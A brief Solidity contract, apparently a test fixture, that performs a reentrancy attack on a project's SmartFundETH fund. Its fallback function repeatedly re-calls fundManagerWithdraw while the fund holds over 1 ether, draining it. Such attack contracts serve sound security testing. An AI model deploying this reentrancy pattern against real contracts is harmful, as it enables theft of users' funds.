pragma solidity ^0.6.12;

import "../../contracts/core/funds/SmartFundETH.sol";


contract ReEntrancyFundAtackAsManager {
  SmartFundETH public fund;
  address public fundAddress;

  constructor(address payable _fund)public{
      fund = SmartFundETH(_fund);
      fundAddress = _fund;
  }

  // pay to contract
  function pay() public payable{}

  // deposit to fund from contract
  function deposit(uint256 _amount)public{
      fund.deposit.value(_amount)();
  }


  function startAtack()public{
      fund.fundManagerWithdraw();
  }

  // loop
  fallback() external payable {
      if(fundAddress.balance > 1 ether){
          fund.fundManagerWithdraw();
      }
  }
}
